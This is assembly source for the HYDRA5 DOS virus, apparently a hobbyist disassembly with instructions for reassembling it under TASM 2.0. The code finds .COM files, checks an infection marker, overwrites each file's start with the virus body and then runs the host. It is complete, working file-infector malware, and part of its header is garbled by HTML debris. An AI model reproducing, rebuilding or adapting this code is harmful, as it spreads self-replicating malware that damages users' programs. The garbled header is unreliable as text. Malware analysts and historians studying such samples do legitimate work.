

  
PAGE  59,132
  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ                             HYDRA5                                   ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ  Disassembly by: -=>Wasp<=- aka="">>Night Crawler< ûû="" ;ûû="" ûû="" ;ûû="" reassemble="" with="" tasm="" 2.0="" ûû="" ;ûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûû="" data_1e="" equ="" 23eh="" data_2e="" equ="" 80h="" data_16e="" equ="" 187h="" data_17e="" equ="" 18ah="" seg_a="" segment="" byte="" public="" assume="" cs:seg_a,="" ds:seg_a="" org="" 100h="" hydra5="" proc="" far="" start:="" jmp="" loc_1="" ;="" (0182)="" db="" 59h,="" 44h,="" 00h,="" 00h="" data_4="" db="" 'hydra-5="" beta="" -="" not="" for="" release'="" db="" '.="" *.co?'="" db="" 0="" data_7="" dw="" 0,="" 84fch="" data_9="" dw="" 0="" data_10="" db="" 0="" db="" 29="" dup="" (0)="" data_11="" db="" 0="" db="" 13="" dup="" (0)="" copyright="" db="" 'copyright="" (c)'="" db="" '="" 1991="" by="" c.a.v.e.="" '="" loc_1:="" push="" ax="" mov="" ax,cs="" add="" ax,1000h="" xor="" di,di="" ;="" zero="" register="" mov="" cx,187h="" mov="" si,offset="" ds:[100h]="" mov="" es,ax="" rep="" movsb="" ;="" rep="" when="" cx="">0 Mov [si] to es:[di]
		MOV	AH,1AH
		MOV	DX,OFFSET DATA_10
		INT	21H			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		MOV	AH,4EH			; 'N'
		MOV	DX,OFFSET DATA_4+22H
		INT	21H			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		JC	LOC_5			; Jump if carry Set
LOC_2:
		MOV	AH,3DH			; '='
		MOV	AL,2
		MOV	DX,OFFSET DATA_11
		MOV	AL,2
		INT	21H			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		MOV	BX,AX
		PUSH	ES
		POP	DS
		MOV	AX,3F00H
		MOV	CX,0FFFFH
		MOV	DX,DATA_16E
		INT	21H			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		ADD	AX,187H
		MOV	CS:DATA_9,AX
		CMP	WORD PTR DS:DATA_17E,4459H
		JNE	LOC_3			; Jump if not equal
		MOV	AH,3EH			; '>'
		INT	21H			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		PUSH	CS
		POP	DS
		MOV	AH,4FH			; 'O'
		INT	21H			; DOS Services  ah=function 4Fh
						;  find next filename match
;*		JC	LOC_6			;*Jump if carry Set
		DB	 72H, 54H
		JMP	SHORT LOC_2		; (01A4)
LOC_3:
		XOR	CX,CX			; Zero register
		MOV	DX,CX
		MOV	AX,4200H
		INT	21H			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		JC	LOC_4			; Jump if carry Set
		MOV	AH,40H			; '@'
		XOR	DX,DX			; Zero register
		MOV	CX,CS:DATA_9
		INT	21H			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
LOC_4:
		MOV	AH,3EH			; '>'
		INT	21H			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		PUSH	CS
		POP	DS
LOC_5:
		MOV	AH,1AH
		MOV	DX,DATA_2E
		INT	21H			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		JMP	SHORT LOC_7		; (0248)
		NOP
		INC	WORD PTR [BX+SI]
		ADD	[BX+SI],AL
		ADD	[BX+SI],AL
		POP	DS
		ADD	[BX],BH
		AAS				; Ascii adjust
		AAS				; Ascii adjust
		AAS				; Ascii adjust
		AAS				; Ascii adjust
		AAS				; Ascii adjust
		AAS				; Ascii adjust
		AAS				; Ascii adjust
		INC	BP
		POP	AX
		INC	BP
		ADD	[BX+SI],AL
		ADD	[BX+SI],AL
		ADD	[BX+SI],AL
		ADD	[BX+SI],AL
		ADD	[BX+SI],AL
		ADD	[BX+SI],AL
		ADD	[BX+SI],AL
		ADD	[BX+SI],AL
		ADD	[BX+SI],AL
		ADD	[BX+SI],AL
		ADD	[BX+SI],AL
		ADD	[BX+SI],AL
		ADD	DS:DATA_1E[BX+SI],BH
		PUSH	AX
		PUSH	CS
		PUSHF				; Push flags
		MOV	CL,13H
		MOV	DX,201H
		PUSH	CS
		POP	DS
		JMP	DWORD PTR DATA_14
		DB	0B4H, 4CH,0CDH, 21H
DATA_14		DD	000C0H
		DB	0CDH, 20H
LOC_7:
		XOR	DI,DI			; Zero register
		MOV	SI,OFFSET DATA_15
		MOV	CX,22H
		REP	MOVSB			; Rep when cx >0 Mov [si] to es:[di]
		POP	BX
		MOV	CS:DATA_7,0
		MOV	WORD PTR CS:DATA_7+2,ES
		POP	BX
		JMP	DWORD PTR CS:DATA_7
DATA_15		DB	1EH
		DB	 07H,0B9H,0FFH,0FFH,0BEH, 87H
		DB	 02H,0BFH, 00H, 01H, 2BH,0CEH
		DB	0F3H,0A4H, 2EH,0C7H, 06H, 00H
		DB	 01H, 00H, 01H, 2EH, 8CH, 1EH
		DB	 02H, 01H, 8BH,0C3H, 2EH,0FFH
		DB	 2EH, 00H, 01H,0CDH
		DB	20H
  
HYDRA5		ENDP
  
SEG_A		ENDS
  
  
  
		END	START

</=->